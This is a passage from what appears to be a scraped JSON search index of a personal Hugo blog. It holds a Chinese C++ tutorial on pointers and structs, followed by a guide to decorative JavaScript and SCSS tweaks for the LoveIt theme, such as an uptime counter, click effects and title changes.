endl; //打印指针变量p //2、指针的使用 //通过*操作指针变量指向的内存(找到的数据) cout \u0026lt;\u0026lt; \u0026#34;*p = \u0026#34; \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 指针变量和普通变量的区别\n普通变量存放的是数据,指针变量存放的是地址 指针变量可以通过\u0026quot; * \u0026ldquo;操作符，操作指针变量指向的内存空间，这个过程称为解引用 总结1： 我们可以通过 \u0026amp; 符号 获取变量的地址\n总结2：利用指针可以记录地址\n总结3：对指针变量解引用(取数据)，可以操作指针指向的内存\n7.3 指针所占内存空间 提问：指针也是种数据类型，那么这种数据类型占用多少内存空间？\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { int a = 10; int * p; p = \u0026amp;a; //指针指向数据a的地址 cout \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; //* 解引用 cout \u0026lt;\u0026lt; sizeof(p) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; sizeof(char *) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; sizeof(float *) \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; sizeof(double *) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：所有指针类型在32位操作系统下是4个字节\n7.4 空指针和野指针 空指针：指针变量指向内存中编号为0的空间\n**用途：**初始化指针变量\n**注意：**空指针指向的内存是不可以访问的\n示例1：空指针\n1 2 3 4 5 6 7 8 9 10 11 12 13 int main() { //指针变量p指向内存地址编号为0的空间 int * p = NULL; //访问空指针报错 //内存编号0 ~255为系统占用内存，不允许用户访问 cout \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 野指针：指针变量指向非法的内存空间\n示例2：野指针\n1 2 3 4 5 6 7 8 9 10 11 12 int main() { //指针变量p指向内存地址编号为0x1100的空间 int * p = (int *)0x1100; //访问野指针报错 cout \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：空指针和野指针都不是我们申请的空间，因此不要访问。\n7.5 const修饰指针 const修饰指针有三种情况\nconst修饰指针 \u0026mdash; 常量指针 const修饰常量 \u0026mdash; 指针常量 const即修饰指针，又修饰常量 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int main() { int a = 10; int b = 10; //const修饰的是指针，指针指向可以改，指针指向的值不可以更改 const int * p1 = \u0026amp;a; p1 = \u0026amp;b; //正确 //*p1 = 100; 报错 //const修饰的是常量，指针指向不可以改，指针指向的值可以更改 int * const p2 = \u0026amp;a; //p2 = \u0026amp;b; //错误 *p2 = 100; //正确 //const既修饰指针又修饰常量 const int * const p3 = \u0026amp;a; //p3 = \u0026amp;b; //错误 //*p3 = 100; //错误 system(\u0026#34;pause\u0026#34;); return 0; } 技巧：看const右侧紧跟着的是指针还是常量, 是指针就是常量指针，是常量就是指针常量\n7.6 指针和数组 **作用：**利用指针访问数组中元素\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int main() { int arr[] = { 1,2,3,4,5,6,7,8,9,10 }; int * p = arr; //指向数组的指针 cout \u0026lt;\u0026lt; \u0026#34;第一个元素： \u0026#34; \u0026lt;\u0026lt; arr[0] \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;指针访问第一个元素： \u0026#34; \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; for (int i = 0; i \u0026lt; 10; i++) { //利用指针遍历数组 cout \u0026lt;\u0026lt; *p \u0026lt;\u0026lt; endl; p++; } system(\u0026#34;pause\u0026#34;); return 0; } 7.7 指针和函数 **作用：**利用指针作函数参数，可以修改实参的值\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 //值传递 void swap1(int a ,int b) { int temp = a; a = b; b = temp; } //地址传递 void swap2(int * p1, int *p2) { int temp = *p1; *p1 = *p2; *p2 = temp; } int main() { int a = 10; int b = 20; swap1(a, b); // 值传递不会改变实参 swap2(\u0026amp;a, \u0026amp;b); //地址传递会改变实参 cout \u0026lt;\u0026lt; \u0026#34;a = \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;b = \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：如果不想修改实参，就用值传递，如果想修改实参，就用地址传递\n7.8 指针、数组、函数 **案例描述：**封装一个函数，利用冒泡排序，实现对整型数组的升序排序\n例如数组：int arr[10] = { 4,3,6,9,1,2,10,8,7,5 };\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 //冒泡排序函数 void bubbleSort(int * arr, int len) //int * arr 也可以写为int arr[] { for (int i = 0; i \u0026lt; len - 1; i++) { for (int j = 0; j \u0026lt; len - 1 - i; j++) { if (arr[j] \u0026gt; arr[j + 1]) { int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } } //打印数组函数 void printArray(int arr[], int len) { for (int i = 0; i \u0026lt; len; i++) { cout \u0026lt;\u0026lt; arr[i] \u0026lt;\u0026lt; endl; } } int main() { int arr[10] = { 4,3,6,9,1,2,10,8,7,5 }; int len = sizeof(arr) / sizeof(int); bubbleSort(arr, len); printArray(arr, len); system(\u0026#34;pause\u0026#34;); return 0; } 总结：当数组名传入到函数作为参数时，被退化为指向首元素的指针\n8 结构体 8.1 结构体基本概念 结构体属于用户==自定义的数据类型==，允许用户存储不同的数据类型\n8.2 结构体定义和使用 语法：struct 结构体名 { 结构体成员列表 }；\n通过结构体创建变量的方式有三种：\nstruct 结构体名 变量名 struct 结构体名 变量名 = { 成员1值 ， 成员2值\u0026hellip;} 定义结构体时顺便创建变量 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 //结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 }stu3; //结构体变量创建方式3 int main() { //结构体变量创建方式1 struct student stu1; //struct 关键字可以省略 stu1.name = \u0026#34;张三\u0026#34;; stu1.age = 18; stu1.score = 100; cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; stu1.name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; stu1.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu1.score \u0026lt;\u0026lt; endl; //结构体变量创建方式2 struct student stu2 = { \u0026#34;李四\u0026#34;,19,60 }; cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; stu2.name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; stu2.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu2.score \u0026lt;\u0026lt; endl; stu3.name = \u0026#34;王五\u0026#34;; stu3.age = 18; stu3.score = 80; cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; stu3.name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; stu3.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu3.score \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结1：定义结构体时的关键字是struct，不可省略\n总结2：创建结构体变量时，关键字struct可以省略\n总结3：结构体变量利用操作符 \u0026lsquo;\u0026rsquo;.\u0026rsquo;\u0026rsquo; 访问成员\n8.3 结构体数组 **作用：**将自定义的结构体放入到数组中方便维护\n语法： struct 结构体名 数组名[元素个数] = { {} , {} , ... {} }\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 } int main() { //结构体数组 struct student arr[3]= { {\u0026#34;张三\u0026#34;,18,80 }, {\u0026#34;李四\u0026#34;,19,60 }, {\u0026#34;王五\u0026#34;,20,70 } }; for (int i = 0; i \u0026lt; 3; i++) { cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; arr[i].name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; arr[i].age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; arr[i].score \u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } 8.4 结构体指针 **作用：**通过指针访问结构体中的成员\n利用操作符 -\u0026gt; 可以通过结构体指针访问结构体属性 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 }; int main() { struct student stu = { \u0026#34;张三\u0026#34;,18,100, }; struct student * p = \u0026amp;stu; p-\u0026gt;score = 80; //指针通过 -\u0026gt; 操作符可以访问成员 cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; p-\u0026gt;name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; p-\u0026gt;age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; p-\u0026gt;score \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：结构体指针可以通过 -\u0026gt; 操作符 来访问结构体中的成员\n8.5 结构体嵌套结构体 作用： 结构体中的成员可以是另一个结构体\n**例如：**每个老师辅导一个学员，一个老师的结构体中，记录一个学生的结构体\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 //学生结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 }; //教师结构体定义 struct teacher { //成员列表 int id; //职工编号 string name; //教师姓名 int age; //教师年龄 struct student stu; //子结构体 学生 }; int main() { struct teacher t1; t1.id = 10000; t1.name = \u0026#34;老王\u0026#34;; t1.age = 40; t1.stu.name = \u0026#34;张三\u0026#34;; t1.stu.age = 18; t1.stu.score = 100; cout \u0026lt;\u0026lt; \u0026#34;教师 职工编号： \u0026#34; \u0026lt;\u0026lt; t1.id \u0026lt;\u0026lt; \u0026#34; 姓名： \u0026#34; \u0026lt;\u0026lt; t1.name \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; t1.age \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;辅导学员 姓名： \u0026#34; \u0026lt;\u0026lt; t1.stu.name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; t1.stu.age \u0026lt;\u0026lt; \u0026#34; 考试分数： \u0026#34; \u0026lt;\u0026lt; t1.stu.score \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } **总结：**在结构体中可以定义另一个结构体作为成员，用来解决实际问题\n8.6 结构体做函数参数 **作用：**将结构体作为参数向函数中传递\n传递方式有两种：\n值传递 地址传递 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 //学生结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 }; //值传递 void printStudent(student stu ) { stu.age = 28; cout \u0026lt;\u0026lt; \u0026#34;子函数中 姓名：\u0026#34; \u0026lt;\u0026lt; stu.name \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; stu.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu.score \u0026lt;\u0026lt; endl; } //地址传递 void printStudent2(student *stu) { stu-\u0026gt;age = 28; cout \u0026lt;\u0026lt; \u0026#34;子函数中 姓名：\u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;name \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;score \u0026lt;\u0026lt; endl; } int main() { student stu = { \u0026#34;张三\u0026#34;,18,100}; //值传递 printStudent(stu); cout \u0026lt;\u0026lt; \u0026#34;主函数中 姓名：\u0026#34; \u0026lt;\u0026lt; stu.name \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; stu.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu.score \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; endl; //地址传递 printStudent2(\u0026amp;stu); cout \u0026lt;\u0026lt; \u0026#34;主函数中 姓名：\u0026#34; \u0026lt;\u0026lt; stu.name \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; stu.age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu.score \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); return 0; } 总结：如果不想修改主函数中的数据，用值传递，反之用地址传递\n8.7 结构体中 const使用场景 **作用：**用const来防止误操作\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 //学生结构体定义 struct student { //成员列表 string name; //姓名 int age; //年龄 int score; //分数 }; //const使用场景 void printStudent(const student *stu) //加const防止函数体中的误操作 { //stu-\u0026gt;age = 100; //操作失败，因为加了const修饰 cout \u0026lt;\u0026lt; \u0026#34;姓名：\u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;name \u0026lt;\u0026lt; \u0026#34; 年龄：\u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;age \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; stu-\u0026gt;score \u0026lt;\u0026lt; endl; } int main() { student stu = { \u0026#34;张三\u0026#34;,18,100 }; printStudent(\u0026amp;stu); system(\u0026#34;pause\u0026#34;); return 0; } 8.8 结构体案例 8.8.1 案例1 案例描述：\n学校正在做毕设项目，每名老师带领5个学生，总共有3名老师，需求如下\n设计学生和老师的结构体，其中在老师的结构体中，有老师姓名和一个存放5名学生的数组作为成员\n学生的成员有姓名、考试分数，创建数组存放3名老师，通过函数给每个老师及所带的学生赋值\n最终打印出老师数据以及老师所带的学生数据。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 struct Student { string name; int score; }; struct Teacher { string name; Student sArray[5]; }; void allocateSpace(Teacher tArray[] , int len) { string tName = \u0026#34;教师\u0026#34;; string sName = \u0026#34;学生\u0026#34;; string nameSeed = \u0026#34;ABCDE\u0026#34;; for (int i = 0; i \u0026lt; len; i++) { tArray[i].name = tName + nameSeed[i]; for (int j = 0; j \u0026lt; 5; j++) { tArray[i].sArray[j].name = sName + nameSeed[j]; tArray[i].sArray[j].score = rand() % 61 + 40; } } } void printTeachers(Teacher tArray[], int len) { for (int i = 0; i \u0026lt; len; i++) { cout \u0026lt;\u0026lt; tArray[i].name \u0026lt;\u0026lt; endl; for (int j = 0; j \u0026lt; 5; j++) { cout \u0026lt;\u0026lt; \u0026#34;\\t姓名：\u0026#34; \u0026lt;\u0026lt; tArray[i].sArray[j].name \u0026lt;\u0026lt; \u0026#34; 分数：\u0026#34; \u0026lt;\u0026lt; tArray[i].sArray[j].score \u0026lt;\u0026lt; endl; } } } int main() { srand((unsigned int)time(NULL)); //随机数种子 头文件 #include \u0026lt;ctime\u0026gt; Teacher tArray[3]; //老师数组 int len = sizeof(tArray) / sizeof(Teacher); allocateSpace(tArray, len); //创建数据 printTeachers(tArray, len); //打印数据 system(\u0026#34;pause\u0026#34;); return 0; } 8.8.2 案例2 案例描述：\n设计一个英雄的结构体，包括成员姓名，年龄，性别;创建结构体数组，数组中存放5名英雄。\n通过冒泡排序的算法，将数组中的英雄按照年龄进行升序排序，最终打印排序后的结果。\n五名英雄信息如下：\n1 2 3 4 5 {\u0026#34;刘备\u0026#34;,23,\u0026#34;男\u0026#34;}, {\u0026#34;关羽\u0026#34;,22,\u0026#34;男\u0026#34;}, {\u0026#34;张飞\u0026#34;,20,\u0026#34;男\u0026#34;}, {\u0026#34;赵云\u0026#34;,21,\u0026#34;男\u0026#34;}, {\u0026#34;貂蝉\u0026#34;,19,\u0026#34;女\u0026#34;}, 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 //英雄结构体 struct hero { string name; int age; string sex; }; //冒泡排序 void bubbleSort(hero arr[] , int len) { for (int i = 0; i \u0026lt; len - 1; i++) { for (int j = 0; j \u0026lt; len - 1 - i; j++) { if (arr[j].age \u0026gt; arr[j + 1].age) { hero temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } } //打印数组 void printHeros(hero arr[], int len) { for (int i = 0; i \u0026lt; len; i++) { cout \u0026lt;\u0026lt; \u0026#34;姓名： \u0026#34; \u0026lt;\u0026lt; arr[i].name \u0026lt;\u0026lt; \u0026#34; 性别： \u0026#34; \u0026lt;\u0026lt; arr[i].sex \u0026lt;\u0026lt; \u0026#34; 年龄： \u0026#34; \u0026lt;\u0026lt; arr[i].age \u0026lt;\u0026lt; endl; } } int main() { struct hero arr[5] = { {\u0026#34;刘备\u0026#34;,23,\u0026#34;男\u0026#34;}, {\u0026#34;关羽\u0026#34;,22,\u0026#34;男\u0026#34;}, {\u0026#34;张飞\u0026#34;,20,\u0026#34;男\u0026#34;}, {\u0026#34;赵云\u0026#34;,21,\u0026#34;男\u0026#34;}, {\u0026#34;貂蝉\u0026#34;,19,\u0026#34;女\u0026#34;}, }; int len = sizeof(arr) / sizeof(hero); //获取数组元素个数 bubbleSort(arr, len); //排序 printHeros(arr, len); //打印 system(\u0026#34;pause\u0026#34;); return 0; } ","date":"2024-05-25T13:35:35+08:00","permalink":"https://hack.liagu-one.top/p/c-%E5%AD%A6%E4%B9%A0/","title":"C++学习"},{"content":"添加网站运行时间 把your_site\\themes\\LoveIt\\layouts\\partials\\footer.html复制到your_site\\layouts\\partials\\路径下。 打开文件your_site\\layouts\\partials\\footer.html，在其中找到\u0026lt;div class=\u0026quot;footer-container\u0026quot;\u0026gt;，并在其下方添加如下内容：\n1 2 3 \u0026lt;div class=\u0026#34;footer-line\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;run-time\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 之后，在我们刚刚新建的your_site\\static\\js\\custom.js文件中添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* 站点运行时间 */ function runtime() { window.setTimeout(\u0026#34;runtime()\u0026#34;, 1000); /* 请修把这里的建站时间换为你自己的 */ let startTime = new Date(\u0026#39;05/23/2023 08:00:00\u0026#39;); let endTime = new Date(); let usedTime = endTime - startTime; let days = Math.floor(usedTime / (24 * 3600 * 1000)); let leavel = usedTime % (24 * 3600 * 1000); let hours = Math.floor(leavel / (3600 * 1000)); let leavel2 = leavel % (3600 * 1000); let minutes = Math.floor(leavel2 / (60 * 1000)); let leavel3 = leavel2 % (60 * 1000); let seconds = Math.floor(leavel3 / (1000)); let runbox = document.getElementById(\u0026#39;run-time\u0026#39;); runbox.innerHTML = \u0026#39;本站已运行\u0026lt;i class=\u0026#34;far fa-clock fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026#39; + ((days \u0026lt; 10) ? \u0026#39;0\u0026#39; : \u0026#39;\u0026#39;) + days + \u0026#39; 天 \u0026#39; + ((hours \u0026lt; 10) ? \u0026#39;0\u0026#39; : \u0026#39;\u0026#39;) + hours + \u0026#39; 时 \u0026#39; + ((minutes \u0026lt; 10) ? \u0026#39;0\u0026#39; : \u0026#39;\u0026#39;) + minutes + \u0026#39; 分 \u0026#39; + ((seconds \u0026lt; 10) ? \u0026#39;0\u0026#39; : \u0026#39;\u0026#39;) + seconds + \u0026#39; 秒 \u0026#39;; } runtime(); 双击生成颜表情 在your_site\\static\\js\\custom.js文件中，添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 /* 返回随机颜色 */ function randomColor() { return \u0026#34;rgb(\u0026#34;+~~(255*Math.random())+\u0026#34;,\u0026#34;+~~(255*Math.random())+\u0026#34;,\u0026#34;+~~(255*Math.random())+\u0026#34;)\u0026#34;; } /* 点击生成字符特效 */ var a_idx = 0; var a_click = 1; /* 生成的字符内容 */ var a = new Array(\u0026#34;乀(ˉεˉ乀)\u0026#34;,\u0026#34;𓂃𓂃𓂃𓊝𓄹𓄺𓂃𓂃𓂃\u0026#34;,\u0026#34;˘ᗜ˘\u0026#34;,\u0026#34;(╥╯^╰╥)\u0026#34;,\u0026#34;╰(*´︶`*)╯\u0026#34;,\u0026#34;✧(◍˃̶ᗜ˂̶◍)✩\u0026#34;,\u0026#34;｡◕‿◕｡\u0026#34;, \u0026#34;(๑ت๑)\u0026#34;,\u0026#34;(๑❛ᴗ❛๑)\u0026#34;,\u0026#34;w(ﾟДﾟ)w\u0026#34;,\u0026#34;Σ( ° △ °|||)︴\u0026#34;,\u0026#34;(⊙ˍ⊙)\u0026#34;,\u0026#34;(๑ˉ∀ˉ๑)\u0026#34;,\u0026#34;\u0026lt;(￣︶￣)\u0026gt;\u0026#34;,\u0026#34;╰(*°▽°*)╯\u0026#34;,\u0026#34;✿\u0026#34;, \u0026#34;(,,•́ . •̀,,)\u0026#34;,\u0026#34;վ\u0026#39;ᴗ\u0026#39; ի\u0026#34;,\u0026#34;(◔◡◔)\u0026#34;,\u0026#34;⚝\u0026#34;,\u0026#34;₍ᐢ. ֑ .ᐢ₎\u0026#34;); jQuery(document).ready(function($) { $(\u0026#34;body\u0026#34;).click(function(e) { /* 点击频率，点击几次就换文字 */ var frequency = 2; if (a_click % frequency === 0) { var $i = $(\u0026#34;\u0026lt;span/\u0026gt;\u0026#34;).text(a[a_idx]); a_idx = (a_idx + 1) % a.length; var x = e.pageX, y = e.pageY; $i.css({ \u0026#34;z-index\u0026#34;: 9999, \u0026#34;top\u0026#34;: y - 20, \u0026#34;left\u0026#34;: x, \u0026#34;position\u0026#34;: \u0026#34;absolute\u0026#34;, \u0026#34;font-weight\u0026#34;: \u0026#34;bold\u0026#34;, \u0026#34;color\u0026#34;: randomColor(), \u0026#34;-webkit-user-select\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;-moz-user-select\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;-ms-user-select\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;user-select\u0026#34;: \u0026#34;none\u0026#34; }); $(\u0026#34;body\u0026#34;).append($i); $i.animate({ \u0026#34;top\u0026#34;: y - 180, \u0026#34;opacity\u0026#34;: 0 }, 1500, function() { $i.remove(); }); } a_click ++; }); }); 离开进入网站的标题变化 可以发现，若离开我的网站去其他页面，那么我的网站的标题和图标会发生变化。若再次回到我的网站，则标题和图标会再次发生变化。想要达到这个效果，只需在your_site\\static\\js\\custom.js文件中添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* 离开当前页面时修改网页标题，回到当前页面时恢复原来标题 */ window.onload = function() { var OriginTitile = document.title; var titleTime; document.addEventListener(\u0026#39;visibilitychange\u0026#39;, function() { if(document.hidden) { $(\u0026#39;[rel=\u0026#34;icon\u0026#34;]\u0026#39;).attr(\u0026#39;href\u0026#39;, \u0026#34;/failure.ico\u0026#34;); $(\u0026#39;[rel=\u0026#34;shortcut icon\u0026#34;]\u0026#39;).attr(\u0026#39;href\u0026#39;, \u0026#34;/failure.ico\u0026#34;); document.title = \u0026#39;哦~该回码头了\u0026#39;; clearTimeout(titleTime); } else { $(\u0026#39;[rel=\u0026#34;icon\u0026#34;]\u0026#39;).attr(\u0026#39;href\u0026#39;, \u0026#34;/favicon.ico\u0026#34;); $(\u0026#39;[rel=\u0026#34;shortcut icon\u0026#34;]\u0026#39;).attr(\u0026#39;href\u0026#39;, \u0026#34;/favicon.ico\u0026#34;); document.title = \u0026#39;哈~又整到薯条了\u0026#39;; titleTime = setTimeout(function() { document.title = OriginTitile; }, 2000); } }); } 其中文字部分改为自己喜欢的就可以了，而至于网站图标文件favicon.ico和failure.ico如果不清楚，具体可见别人之前的文章 Hugo 的美化。\n这里只简单的说一下：一般而言，我们会把网站图标放到your_site\\static\\路径下，而在当前的目的下，我们可以只调用48*48的.ico文件作为显示图标。此外，favicon.ico一般是我们原来的网站图标，所以我们只需要在创建一个failure.ico作为离开页面时显示的图标即可。\n首页头像旋转 这是一个没什么用的功能，但是好玩。\n找到your_site\\assets\\css\\_custom.scss文件，在里面添加如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* 头像旋转 */ .home .home-profile .home-avatar img { width: 5rem; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ease-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out; \u0026amp;:hover { /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg); } } 鼠标点击特效 在custom.js添加如下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 function clickEffect() { let balls = []; let longPressed = false; let longPress; let multiplier = 0; let width, height; let origin; let normal; let ctx; const colours = [\u0026#34;#F73859\u0026#34;, \u0026#34;#14FFEC\u0026#34;, \u0026#34;#00E0FF\u0026#34;, \u0026#34;#FF99FE\u0026#34;, \u0026#34;#FAF15D\u0026#34;]; const canvas = document.createElement(\u0026#34;canvas\u0026#34;); document.body.appendChild(canvas); canvas.setAttribute(\u0026#34;style\u0026#34;, \u0026#34;width: 100%; height: 100%; top: 0; left: 0; z-index: 99999; position: fixed; pointer-events: none;\u0026#34;); const pointer = document.createElement(\u0026#34;span\u0026#34;); pointer.classList.add(\u0026#34;pointer\u0026#34;); document.body.appendChild(pointer); if (canvas.getContext \u0026amp;\u0026amp; window.addEventListener) { ctx = canvas.getContext(\u0026#34;2d\u0026#34;); updateSize(); window.addEventListener(\u0026#39;resize\u0026#39;, updateSize, false); loop(); window.addEventListener(\u0026#34;mousedown\u0026#34;, function(e) { pushBalls(randBetween(10, 20), e.clientX, e.clientY); document.body.classList.add(\u0026#34;is-pressed\u0026#34;); longPress = setTimeout(function() { document.body.classList.add(\u0026#34;is-longpress\u0026#34;); longPressed = true; }, 500); }, false); window.addEventListener(\u0026#34;mouseup\u0026#34;, function(e) { clearTimeout(longPress); if (longPressed == true) { document.body.classList.remove(\u0026#34;is-longpress\u0026#34;); pushBalls(randBetween(50 + Math.ceil(multiplier), 100 + Math.ceil(multiplier)), e.clientX, e.clientY); longPressed = false; } document.body.classList.remove(\u0026#34;is-pressed\u0026#34;); }, false); window.addEventListener(\u0026#34;mousemove\u0026#34;, function(e) { let x = e.clientX; let y = e.clientY; pointer.style.top = y + \u0026#34;px\u0026#34;; pointer.style.left = x + \u0026#34;px\u0026#34;; }, false); } else { console.log(\u0026#34;canvas or addEventListener is unsupported!\u0026#34;); } function updateSize() { canvas.width = window.innerWidth * 2; canvas.height = window.innerHeight * 2; canvas.style.width = window.innerWidth + \u0026#39;px\u0026#39;; canvas.style.height = window.innerHeight + \u0026#39;px\u0026#39;; ctx.scale(2, 2); width = (canvas.width = window.innerWidth); height = (canvas.height = window.innerHeight); origin = { x: width / 2, y: height / 2 }; normal = { x: width / 2, y: height / 2 }; } class Ball { constructor(x = origin.x, y = origin.y) { this.x = x; this.y = y; this.angle = Math.PI * 2 * Math.random(); if (longPressed == true) { this.multiplier = randBetween(14 + multiplier, 15 + multiplier); } else { this.multiplier = randBetween(6, 12); } this.vx = (this.multiplier + Math.random() * 0.5) * Math.cos(this.angle); this.vy = (this.multiplier + Math.random() * 0.5) * Math.sin(this.angle); this.r = randBetween(2, 4) + Math.random(); // 修改后的半径值 this.color = 